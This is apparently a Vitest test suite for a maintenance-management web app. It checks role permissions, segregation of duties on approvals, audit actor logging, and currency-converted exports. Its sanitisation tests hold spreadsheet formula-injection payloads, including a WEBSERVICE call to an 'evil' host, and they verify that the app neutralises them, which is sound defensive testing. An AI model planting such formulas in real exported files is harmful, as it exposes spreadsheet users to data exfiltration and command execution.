import { beforeEach, describe, expect, it, vi } from 'vitest';
import * as XLSX from 'xlsx';
import { AuthorizationService } from '../../core/security/AuthorizationService';
import { ROLES } from '../../core/security/Roles';
import { useGmaoStore } from '../../store/useGmaoStore';
import { FinanceRepo } from '../../application/repositories/FinanceRepo';
import { AuditRepo } from '../../application/repositories/AuditRepo';
import { storageService } from '../../utils/storageService';
import { STORAGE_KEYS } from '../../infrastructure/persistence/storageKeys';
import {
  sanitizeCsvCell,
  sanitizeSpreadsheetCell,
  sanitizeSpreadsheetRows,
} from '../../utils/spreadsheetSanitize';
import {
  buildShiftOrWeeklyReport,
  buildShiftWeeklyReportCsv,
  buildShiftWeeklyReportExportRows,
} from '../../application/services/ShiftWeeklyReportEngine';
import { FinancialExportService } from '../../services/financialExportService';
import { MonthlyReportExportService } from '../../services/monthlyReportExportService';
import { FinancialCalculationService } from '../../application/services/FinancialCalculationService';
import { MonthlyReportCalculationService } from '../../application/services/MonthlyReportCalculationService';
import type { CurrencyFinancialConfig } from '../../utils/currencyService';

function setSessionUser(role: string, id: string, name: string) {
  if (typeof window !== 'undefined' && window.sessionStorage) {
    window.sessionStorage.setItem('gmao_session_v2', JSON.stringify({ id, name, role }));
  }
}

function clearSessionUser() {
  if (typeof window !== 'undefined' && window.sessionStorage) {
    window.sessionStorage.removeItem('gmao_session_v2');
  }
}

describe('Phase A — RBAC, Segregation of Duties (SoD), Audit Actor & Export Security', () => {
  beforeEach(() => {
    clearSessionUser();
    storageService.removeItem(STORAGE_KEYS.FINANCIAL_BUDGETS);
    storageService.setItem(STORAGE_KEYS.AUDIT_EVENTS, []);
    useGmaoStore.setState({
      rawStock: [
        {
          id: 'PDR-1',
          ref: 'RLT-6205',
          reference: 'RLT-6205',
          designation: 'Roulement 6205',
          stockInitial: 20,
          stockMin: 2,
          prixUnitaire: 100,
          prix_unitaire: 100,
        } as any,
      ],
      machines: [
        {
          id: 'M-01',
          code: 'M-01',
          nom: 'Presse 01',
          statut: 'Active',
          is_active: true,
        } as any,
      ],
      mouvements: [],
      correctiveInterventions: [],
      preventiveTasks: [
        {
          id: 'PM-TASK-1',
          code: 'PM-01',
          id_machine: 'M-01',
          composant: 'Palier',
          action_code: 'C',
          frequence: 'Mensuel',
          etat: 'À faire',
        } as any,
      ],
      preventiveExecutions: [],
      sortieDemands: [],
      auditEvents: [],
    });
  });

  describe('1. RBAC Policy Alignment', () => {
    it('blocks TECHNICIEN from corrective.manage while preserving corrective.execute', () => {
      const tech = { id: 'T1', role: ROLES.TECHNICIEN };
      const resp = { id: 'R1', role: ROLES.RESPONSABLE_MAINTENANCE };
      const admin = { id: 'A1', role: ROLES.ADMIN };

      expect(AuthorizationService.hasPermission(tech, 'corrective.manage')).toBe(false);
      expect(AuthorizationService.hasPermission(tech, 'corrective.execute')).toBe(true);
      expect(AuthorizationService.hasPermission(resp, 'corrective.manage')).toBe(true);
      expect(AuthorizationService.hasPermission(admin, 'corrective.manage')).toBe(true);
    });

    it('denies VIEWER access to shift_weekly_report while allowing executive roles', () => {
      expect(AuthorizationService.canAccessTab({ id: 'V1', role: ROLES.VIEWER }, 'shift_weekly_report')).toBe(false);
      expect(AuthorizationService.canAccessTab({ id: 'M1', role: ROLES.RESPONSABLE_MAGASIN }, 'shift_weekly_report')).toBe(true);
      expect(AuthorizationService.canAccessTab({ id: 'R1', role: ROLES.RESPONSABLE_MAINTENANCE }, 'shift_weekly_report')).toBe(true);
      expect(AuthorizationService.canAccessTab({ id: 'A1', role: ROLES.ADMIN }, 'shift_weekly_report')).toBe(true);
    });
  });

  describe('2. Maker-Checker RBAC & Segregation of Duties (SoD)', () => {
    it('blocks TECHNICIEN from approving corrective BT via store action', () => {
      useGmaoStore.setState({
        correctiveInterventions: [
          {
            id: 'BT-RBAC-1',
            num_bt: 'BT-2026-901',
            code_machine: 'M-01',
            statut: 'EN_COURS',
            validation_status: 'PENDING_VALIDATION',
            submitted_by_id: 'TECH-01',
            submitted_by_name: 'Karim',
            action_realisee: 'Graissage',
          } as any,
        ],
      });

      setSessionUser('TECHNICIEN', 'TECH-01', 'Karim');
      const blocked = useGmaoStore.getState().handleReviewInterventionValidation('BT-RBAC-1', {
        decision: 'APPROVED',
      });
      expect(blocked).toBeNull();
      expect(
        useGmaoStore.getState().correctiveInterventions[0].validation_status
      ).toBe('PENDING_VALIDATION');
    });

    it('enforces Segregation of Duties (SoD): blocks self-approval on BT, PM, and SortieDemand, and allows a second manager', () => {
      // A) Corrective BT submitted by RESP-1
      setSessionUser('RESPONSABLE_MAINTENANCE', 'RESP-1', 'Chef Alpha');
      useGmaoStore.setState({
        correctiveInterventions: [
          {
            id: 'BT-SOD-1',
            num_bt: 'BT-2026-902',
            code_machine: 'M-01',
            statut: 'EN_COURS',
            action_realisee: 'Remplacement roulement',
          } as any,
        ],
      });
      useGmaoStore.getState().handleSubmitInterventionForValidation('BT-SOD-1', {
        intervention_nature: 'REPLACE',
        pieces_proposees: [{ ref: 'RLT-6205', quantite: 1 }],
      });

      const btSelfApprove = useGmaoStore.getState().handleReviewInterventionValidation('BT-SOD-1', {
        decision: 'APPROVED',
        validated_by_id: 'RESP-1',
        validated_by_name: 'Chef Alpha',
      });
      expect(btSelfApprove).toBeNull();
      expect(useGmaoStore.getState().mouvements).toHaveLength(0);

      // B) Preventive Execution submitted by RESP-1
      const pmExec = useGmaoStore.getState().handleMarkTaskDone('PM-TASK-1', {
        submitForValidation: true,
        technicien: 'Chef Alpha',
        submitted_by_id: 'RESP-1',
        submitted_by_name: 'Chef Alpha',
        duree_reelle_min: 30,
      });
      expect(pmExec).toBeTruthy();
      const pmExecId = String((pmExec as { id?: string })?.id || '');

      const pmSelfApprove = useGmaoStore
        .getState()
        .handleReviewPreventiveExecutionValidation(pmExecId, {
          decision: 'APPROVED',
          validated_by_id: 'RESP-1',
          validated_by_name: 'Chef Alpha',
        });
      expect(pmSelfApprove).toBeNull();

      // C) Sortie Demand submitted by RESP-1
      const sd = useGmaoStore.getState().handleSubmitSortieDemand({
        submitted_by_id: 'RESP-1',
        submitted_by_name: 'Chef Alpha',
        id_machine_registered: 'M-01',
        items: [{ ref: 'RLT-6205', designation: 'Roulement 6205', quantite: 1, prix_unitaire: 100 }],
      });
      expect(sd).toBeTruthy();

      const sdSelfApprove = useGmaoStore
        .getState()
        .handleReviewSortieDemandValidation(String(sd!.id), {
          decision: 'APPROVED',
          validated_by_id: 'RESP-1',
          validated_by_name: 'Chef Alpha',
        });
      expect(sdSelfApprove).toBeNull();
      expect(useGmaoStore.getState().mouvements).toHaveLength(0);

      // D) Second independent manager (RESP-2) approves all three successfully
      setSessionUser('ADMIN', 'RESP-2', 'Directeur Technique');
      expect(
        useGmaoStore.getState().handleReviewInterventionValidation('BT-SOD-1', {
          decision: 'APPROVED',
          validated_by_id: 'RESP-2',
          validated_by_name: 'Directeur Technique',
        })?.validation_status
      ).toBe('APPROVED');

      expect(
        useGmaoStore
          .getState()
          .handleReviewPreventiveExecutionValidation(pmExecId, {
            decision: 'APPROVED',
            validated_by_id: 'RESP-2',
            validated_by_name: 'Directeur Technique',
          })?.validation_status
      ).toBe('APPROVED');

      expect(
        useGmaoStore
          .getState()
          .handleReviewSortieDemandValidation(String(sd!.id), {
            decision: 'APPROVED',
            validated_by_id: 'RESP-2',
            validated_by_name: 'Directeur Technique',
          })?.validation_status
      ).toBe('APPROVED');
    });
  });

  describe('3. FinanceRepo Audit Actor Metadata', () => {
    it('logs real actorId, actorName, and actorRole on budget updates instead of hardcoded ADMIN', () => {
      storageService.setItem(STORAGE_KEYS.AUDIT_EVENTS, []);
      const saved = FinanceRepo.saveFinancialBudget(
        {
          fiscalYear: 2026,
          allocatedPreventive: 50000,
          allocatedCorrective: 40000,
        },
        {
          id: 'USR-MGR-7',
          name: 'Amine Maint',
          role: 'RESPONSABLE_MAINTENANCE',
        }
      );

      expect(saved.updatedBy).toBe('Amine Maint');
      const events = AuditRepo.getAuditEvents();
      expect(events.length).toBeGreaterThan(0);
      expect(events[0].actorId).toBe('USR-MGR-7');
      expect(events[0].actorName).toBe('Amine Maint');
      expect(events[0].actorRole).toBe('RESPONSABLE_MAINTENANCE');
    });
  });

  describe('4. Spreadsheet Formula Injection Sanitization & Multi-Currency Export Parity', () => {
    it('neutralizes formula triggers while preserving native numeric types', () => {
      expect(sanitizeSpreadsheetCell('=CMD()')).toBe("'=CMD()");
      expect(sanitizeSpreadsheetCell('+1+1')).toBe("'+1+1");
      expect(sanitizeSpreadsheetCell('-1+1')).toBe("'-1+1");
      expect(sanitizeSpreadsheetCell('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
      expect(sanitizeSpreadsheetCell('\t=1')).toBe("'\t=1");
      expect(sanitizeSpreadsheetCell('  =WEBSERVICE("http://evil")')).toBe(
        "'  =WEBSERVICE(\"http://evil\")"
      );
      expect(sanitizeSpreadsheetCell(1250.5)).toBe(1250.5);
      expect(sanitizeSpreadsheetCell('-')).toBe('-');
      expect(sanitizeCsvCell('=1+1')).toBe('"\'=1+1"');

      const sanitized = sanitizeSpreadsheetRows([['=A1', 500, 'Normal']]);
      expect(sanitized).toEqual([["'=A1", 500, 'Normal']]);
    });

    it('exports Shift/Weekly CSV with active currency conversion (no hardcoded EUR) and neutralized formulas', () => {
      const eurConfig: CurrencyFinancialConfig = {
        activeCurrencyCode: 'EUR',
        baseCurrencyCode: 'MAD',
        madSymbolVariant: 'DH',
        exchangeRates: { MAD: 1, USD: 0.1, EUR: 0.092 },
        applyExchangeRateConversion: true,
        vatRatePercent: 20,
        fiscalYear: 2026,
      };

      const report = buildShiftOrWeeklyReport({
        from: '2026-06-01',
        to: '2026-06-07',
        stockItems: [],
        machines: [{ id: 'M-01', code: 'M-01', nom: '=EVIL()', statut: 'Active', is_active: true }],
        mouvements: [
          {
            id: 'MVT-1',
            date: '2026-06-02',
            code_bon: 'BS-100',
            type: 'Sortie Interne',
            ref: 'RLT-6205',
            designation: '+SUM(1,2)',
            quantite: 10,
            prix_unitaire: 100, // 1000 MAD -> 92 EUR
            id_machine_registered: 'M-01',
          },
        ],
        correctiveInterventions: [
          {
            id: 'BT-1',
            num_bt: 'BT-1',
            code_machine: 'M-01',
            statut: 'CLOTURE',
            validation_status: 'APPROVED',
            date_cloture: '2026-06-02',
            cout_pdr: 1000,
            pieces_utilisees: [{ ref: 'RLT-6205', quantite: 10, prix_unitaire: 100 }],
          } as any,
        ],
        preventiveTasks: [],
        preventiveExecutions: [],
      });

      const madRows = buildShiftWeeklyReportExportRows(report, {
        ...eurConfig,
        activeCurrencyCode: 'MAD',
        applyExchangeRateConversion: false,
      });
      expect(madRows.some((r) => r[2] === 'MAD')).toBe(true);
      expect(madRows.some((r) => r[2] === 'EUR')).toBe(false);

      const eurCsv = buildShiftWeeklyReportCsv(report, eurConfig);
      expect(eurCsv).toContain('92');
      expect(eurCsv).toContain('"\'=EVIL()"');
      expect(eurCsv).toContain('"\'+SUM(1,2)"');
    });

    it('converts FinancialExportService & MonthlyReportExportService workbooks consistently and sanitizes cells', () => {
      const writeSpy = vi.spyOn(XLSX, 'writeFile').mockImplementation(() => undefined);
      try {
        const eurConfig: CurrencyFinancialConfig = {
          activeCurrencyCode: 'EUR',
          baseCurrencyCode: 'MAD',
          madSymbolVariant: 'DH',
          exchangeRates: { MAD: 1, USD: 0.1, EUR: 0.092 },
          applyExchangeRateConversion: true,
          vatRatePercent: 20,
          fiscalYear: 2026,
        };

        const synthesis = FinancialCalculationService.computeFinancialSynthesis({
          fiscalYear: 2026,
          budget: {
            fiscalYear: 2026,
            allocatedPreventive: 1000,
            allocatedCorrective: 1000,
            allocatedExternal: 0,
            allocatedSparesStock: 0,
            technicianHourlyRate: 100,
            productionDowntimeCostPerHour: 1000,
            berThresholdPercent: 70,
            defaultVatRate: 20,
            periodMode: 'ANNUAL',
            burnWarningPercent: 90,
            updatedAt: '2026-06-01T00:00:00.000Z',
            updatedBy: '=BAD_USER()',
          },
          machines: [
            { id: 'M-1', code: 'M-1', nom: '@PAYLOAD', valeur_a_neuf: 10000 },
          ],
          stockItems: [],
          mouvements: [],
          correctiveInterventions: [],
          preventiveExecutions: [],
          sortiesExterne: [],
        });

        FinancialExportService.exportFinancialSynthesisToExcel(synthesis, '€', eurConfig);
        expect(writeSpy).toHaveBeenCalledTimes(1);
        const wbFin = writeSpy.mock.calls[0][0] as XLSX.WorkBook;
        const budgetWs = wbFin.Sheets['Synthèse Budgétaire'];
        const budgetAoa = XLSX.utils.sheet_to_json<any[]>(budgetWs, { header: 1 });
        // 1000 MAD * 0.092 = 92 EUR
        const prevRow = budgetAoa.find((r) => String(r[0] || '').includes('Maintenance Préventive'));
        expect(prevRow?.[1]).toBe(92);

        const tcoWs = wbFin.Sheets['TCO & Amortissement'];
        const tcoAoa = XLSX.utils.sheet_to_json<any[]>(tcoWs, { header: 1 });
        expect(tcoAoa[1][1]).toBe("'@PAYLOAD");
        expect(tcoAoa[1][4]).toBe(920); // 10000 MAD * 0.092

        // Monthly report XLSX parity + sanitization
        const comparison = MonthlyReportCalculationService.calculateMonthOverMonthComparison({
          month: '2026-06',
          stockItems: [
            { ref: 'P1', designation: '=INJECT', stockActuel: 10, stockMin: 2, prixUnitaire: 100 },
          ],
          mouvements: [],
          correctiveInterventions: [],
          preventiveTasks: [],
          preventiveExecutions: [],
          machines: [],
        });
        MonthlyReportExportService.exportMonthlyReportToExcel(comparison, {
          currencyConfig: eurConfig,
        });
        expect(writeSpy).toHaveBeenCalledTimes(2);
        const wbMonth = writeSpy.mock.calls[1][0] as XLSX.WorkBook;
        const synthWs = wbMonth.Sheets['Synthese_Direction'];
        const synthAoa = XLSX.utils.sheet_to_json<any[]>(synthWs, { header: 1 });
        const stockValRow = synthAoa.find((r) => String(r[0] || '').includes('Valorisation'));
        // 10 * 100 MAD = 1000 MAD -> 92 EUR
        expect(stockValRow?.[1]).toBe(92);
      } finally {
        writeSpy.mockRestore();
      }
    });
  });
});
